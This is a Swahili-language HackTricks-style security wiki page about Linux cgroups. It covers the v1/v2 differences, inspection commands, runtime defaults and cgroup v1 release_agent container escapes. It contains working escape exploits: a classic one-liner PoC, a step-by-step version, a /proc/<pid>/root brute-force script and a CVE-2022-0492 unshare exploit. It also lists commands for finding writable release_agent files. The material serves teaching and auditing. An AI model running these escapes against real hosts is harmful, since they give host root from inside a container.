# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** ni mechanism ya kernel inayotumika kuweka processes pamoja kwa ajili ya accounting, limiting, prioritization, na policy enforcement. Ikiwa namespaces zinahusu hasa kutenganisha mtazamo wa resources, cgroups zinahusu hasa kudhibiti **kiasi gani** cha resources hizo seti ya processes inaweza kutumia na, katika baadhi ya hali, **ni aina zipi za resources** wanazoweza kuingiliana nazo kabisa. Containers hutegemea cgroups kila wakati, hata wakati mtumiaji hazikagui moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kuiambia kernel "hizi processes ni za workload hii, na hizi ndizo resource rules zinazotumika kwao".

Hii ndiyo sababu container engines huweka container mpya ndani ya cgroup subtree yake. Baada ya process tree kuwa humo, runtime inaweza kuweka kikomo cha memory, kupunguza idadi ya PIDs, kuweka uzito wa matumizi ya CPU, kudhibiti I/O, na kuzuia device access. Katika production environment, hii ni muhimu kwa usalama wa multi-tenant na pia kwa operational hygiene ya kawaida. Container isiyo na meaningful resource controls inaweza kumaliza memory, kujaza system kwa processes, au kutawala CPU na I/O kwa njia zinazofanya host au neighboring workloads zikose stability.

Kwa mtazamo wa security, cgroups ni muhimu kwa njia mbili tofauti. Kwanza, resource limits mbaya au zinazokosekana huwezesha denial-of-service attacks za moja kwa moja. Pili, baadhi ya cgroup features, hasa katika setups za zamani za **cgroup v1**, kihistoria zimeunda breakout primitives zenye nguvu wakati ziliweza kuandikwa kutoka ndani ya container.

## v1 Vs v2

Kuna cgroup models mbili kuu zinazotumika. **cgroup v1** huonyesha controller hierarchies nyingi, na exploit writeups za zamani mara nyingi huzunguka semantics zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zinazopatikana humo. **cgroup v2** huleta hierarchy iliyounganishwa zaidi na kwa ujumla behavior iliyo safi zaidi. Distributions za kisasa zinazidi kupendelea cgroup v2, lakini environments zilizochanganyika au legacy bado zipo, jambo linalomaanisha kuwa models zote mbili bado zina umuhimu wakati wa kukagua systems halisi.

Tofauti hii ni muhimu kwa sababu baadhi ya container breakout stories maarufu, kama vile matumizi mabaya ya **`release_agent`** katika cgroup v1, yanahusiana mahususi na cgroup behavior ya zamani. Msomaji anayeona cgroup exploit kwenye blogu kisha kuitumia bila kufikiri kwenye system ya kisasa inayotumia cgroup v2 pekee, ana uwezekano wa kutoelewa kinachowezekana kwenye target.

## Inspection

Njia ya haraka zaidi ya kuona shell yako ya sasa iko wapi ni:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Faili ya `/proc/self/cgroup` inaonyesha njia za cgroup zinazohusishwa na mchakato wa sasa. Kwenye host ya kisasa ya cgroup v2, mara nyingi utaona ingizo lililounganishwa. Kwenye host za zamani au mseto, unaweza kuona njia nyingi za controllers za v1. Ukishajua njia hiyo, unaweza kukagua faili zinazolingana chini ya `/sys/fs/cgroup` ili kuona limits na matumizi ya sasa.

Kwenye host ya cgroup v2, commands zifuatazo ni muhimu:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Faili hizi zinaonyesha ni controllers zipi zilizopo na ni zipi zimekabidhiwa kwa child cgroups. Muundo huu wa ukabidhi ni muhimu katika mazingira ya rootless na yanayosimamiwa na systemd, ambapo runtime inaweza kuwa na uwezo wa kudhibiti tu sehemu ya utendaji wa cgroup ambayo parent hierarchy imekabidhi.

## Maabara

Njia moja ya kuchunguza cgroups kwa vitendo ni kuendesha container yenye kikomo cha memory:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Unaweza pia kujaribu container yenye kikomo cha PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Mifano hii ni muhimu kwa sababu inasaidia kuunganisha runtime flag na kernel file interface. Runtime hailazimishi rule kwa uchawi; inaandika cgroup settings husika na kisha kuiacha kernel izilazimishe dhidi ya process tree.

## Matumizi ya Runtime

Docker, Podman, containerd, na CRI-O zote hutegemea cgroups kama sehemu ya uendeshaji wa kawaida. Tofauti kwa kawaida hazihusu kama zinatumia cgroups, bali zinahusu **defaults wanazochagua**, **jinsi zinavyoingiliana na systemd**, **jinsi rootless delegation inavyofanya kazi**, na **kiasi cha configuration kinachodhibitiwa katika engine level dhidi ya orchestration level**.

Katika Kubernetes, resource requests na limits hatimaye huwa cgroup configuration kwenye node. Njia kutoka Pod YAML hadi kernel enforcement hupitia kubelet, CRI runtime, na OCI runtime, lakini cgroups bado ndiyo kernel mechanism inayotumia rule hatimaye. Katika mazingira ya Incus/LXC, cgroups pia hutumiwa kwa kiwango kikubwa, hasa kwa sababu system containers mara nyingi huonyesha process tree iliyo pana zaidi na matarajio ya kiutendaji yanayofanana zaidi na VM.

## Misconfigurations Na Breakouts

Hadithi ya kawaida ya cgroup security ni utaratibu wa writable **cgroup v1 `release_agent`**. Katika model hiyo, ikiwa attacker angeweza kuandika kwenye cgroup files zinazofaa, kuwezesha `notify_on_release`, na kudhibiti path iliyohifadhiwa katika `release_agent`, kernel ingeweza kuishia kutekeleza path iliyochaguliwa na attacker katika initial namespaces kwenye host wakati cgroup ilipokuwa tupu. Ndiyo sababu writeups za zamani huweka mkazo mkubwa kwenye cgroup controller writability, mount options, na namespace/capability conditions.

Hata wakati `release_agent` haipatikani, makosa ya cgroup bado ni muhimu. Device access iliyo pana kupita kiasi inaweza kufanya host devices zifikiwe kutoka ndani ya container. Kukosekana kwa memory na PID limits kunaweza kubadilisha code execution rahisi kuwa host DoS. Cgroup delegation dhaifu katika rootless scenarios pia inaweza kuwapotosha defenders na kuwafanya waamini kuwa restriction ipo, ilhali runtime haikuwahi kuwa na uwezo wa kuitekeleza.

### `release_agent` Background

Mbinu ya `release_agent` inatumika tu kwa **cgroup v1**. Wazo la msingi ni kwamba process ya mwisho katika cgroup inapotoka na `notify_on_release=1` ikiwa imewekwa, kernel hutekeleza program ambayo path yake imehifadhiwa katika `release_agent`. Utekelezaji huo hutokea katika **initial namespaces kwenye host**, jambo linalobadilisha writable `release_agent` kuwa container escape primitive.

Ili mbinu hiyo ifanye kazi, attacker kwa kawaida anahitaji:

- writable **cgroup v1** hierarchy
- uwezo wa kuunda au kutumia child cgroup
- uwezo wa kuweka `notify_on_release`
- uwezo wa kuandika path ndani ya `release_agent`
- path inayorejelea executable kulingana na mtazamo wa host

### Classic PoC

Historical one-liner PoC ni:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
PoC hii huandika path ya payload kwenye `release_agent`, huanzisha cgroup release, kisha husoma faili la matokeo lililotengenezwa kwenye host.

### Maelezo ya Hatua kwa Hatua Yanayoeleweka

Wazo hili ni rahisi kuelewa linapogawanywa katika hatua.

1. Unda na uandae cgroup inayoweza kuandikwa:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Tambua path ya host inayolingana na filesystem ya container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Weka payload itakayoonekana kutoka kwenye path ya host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Anzisha utekelezaji kwa kufanya cgroup iwe tupu:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Athari hiyo ni utekelezaji wa payload upande wa host ukiwa na host root privileges. Katika exploit halisi, payload kwa kawaida huandika proof file, huanzisha reverse shell, au hubadilisha hali ya host.

### Relative Path Variant Using `/proc/<pid>/root`

Katika baadhi ya mazingira, path ya host kuelekea container filesystem haiko wazi au imefichwa na storage driver. Katika hali hiyo, path ya payload inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni host PID inayohusishwa na mchakato ulio ndani ya current container. Huo ndio msingi wa relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Ujanja muhimu hapa si brute force yenyewe bali muundo wa path: `/proc/<pid>/root/...` huwezesha kernel kutatua file iliyo ndani ya container filesystem kutoka host namespace, hata wakati path ya moja kwa moja ya host storage haijulikani mapema.

### CVE-2022-0492 Variant

Mnamo 2022, CVE-2022-0492 ilionyesha kuwa kuandika kwenye `release_agent` katika cgroup v1 hakukuwa kukikagua ipasavyo `CAP_SYS_ADMIN` katika **initial** user namespace. Hili lilifanya technique ipatikane kwa urahisi zaidi kwenye kernels zilizo hatarini kwa sababu container process ambayo ingeweza ku-mount cgroup hierarchy ingeweza kuandika `release_agent` bila kuwa tayari privileged katika host user namespace.

Exploit ya chini kabisa:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Kwenye kernel iliyo hatarini, host hutekeleza `/proc/self/exe` ikiwa na root privileges za host.

Kwa abuse ya vitendo, anza kwa kuangalia ikiwa mazingira bado yanaonyesha paths za cgroup-v1 zinazoweza kuandikwa au ufikiaji hatari wa vifaa:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Ikiwa `release_agent` ipo na inaweza kuandikwa, tayari uko katika eneo la legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Ikiwa cgroup path yenyewe haitoi escape, matumizi mengine ya kiutendaji mara nyingi huwa ni denial of service au reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Amri hizi hukuambia haraka ikiwa workload ina nafasi ya kuunda fork-bomb, kutumia memory kwa nguvu, au kutumia vibaya interface ya zamani ya cgroup inayoweza kuandikwa.

## Ukaguzi

Wakati wa kukagua target, madhumuni ya ukaguzi wa cgroup ni kubaini ni model gani ya cgroup inayotumika, ikiwa container inaona controller paths zinazoweza kuandikwa, na ikiwa breakout primitives za zamani kama `release_agent` bado zina umuhimu.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Kinachovutia hapa:

- Ikiwa `mount | grep cgroup` inaonyesha **cgroup v1**, maandishi ya zamani kuhusu breakout yanakuwa muhimu zaidi.
- Ikiwa `release_agent` ipo na inaweza kufikiwa, hilo linastahili uchunguzi wa kina mara moja.
- Ikiwa cgroup hierarchy inayoonekana inaweza kuandikwa na container pia ina capabilities zenye nguvu, mazingira hayo yanahitaji ukaguzi wa karibu zaidi.

Ukigundua **cgroup v1**, controller mounts zinazoweza kuandikwa, na container ambayo pia ina capabilities zenye nguvu au ulinzi dhaifu wa seccomp/AppArmor, mchanganyiko huo unahitaji uangalifu mkubwa. cgroups mara nyingi huchukuliwa kama mada ya kawaida ya resource-management, lakini kihistoria zimekuwa sehemu ya baadhi ya container escape chains zenye mafunzo makubwa, hasa kwa sababu mpaka kati ya "resource control" na "host influence" haukuwa safi kila mara kama watu walivyodhani.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Imewezeshwa kwa chaguo-msingi | Containers huwekwa kwenye cgroups automatically; resource limits ni za hiari isipokuwa ziwekwe kwa flags | kuacha `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Imewezeshwa kwa chaguo-msingi | `--cgroups=enabled` ndiyo chaguo-msingi; cgroup namespace defaults hutofautiana kulingana na cgroup version (`private` kwenye cgroup v2, `host` kwenye baadhi ya mipangilio ya cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, device access iliyolegezwa, `--privileged` |
| Kubernetes | Huwa imewezeshwa kupitia runtime kwa chaguo-msingi | Pods na containers huwekwa kwenye cgroups na node runtime; resource control ya kiwango cha chini hutegemea `resources.requests` / `resources.limits` | kuacha resource requests/limits, privileged device access, runtime misconfiguration ya kiwango cha host |
| containerd / CRI-O | Imewezeshwa kwa chaguo-msingi | cgroups ni sehemu ya kawaida ya lifecycle management | runtime configs za moja kwa moja zinazolegeza device controls au kufichua legacy writable cgroup v1 interfaces |

Tofauti muhimu ni kwamba **uwepo wa cgroup** kwa kawaida ni wa chaguo-msingi, ilhali **resource constraints zenye manufaa** mara nyingi ni za hiari isipokuwa ziwekwe wazi.
{{#include ../../../../banners/hacktricks-training.md}}
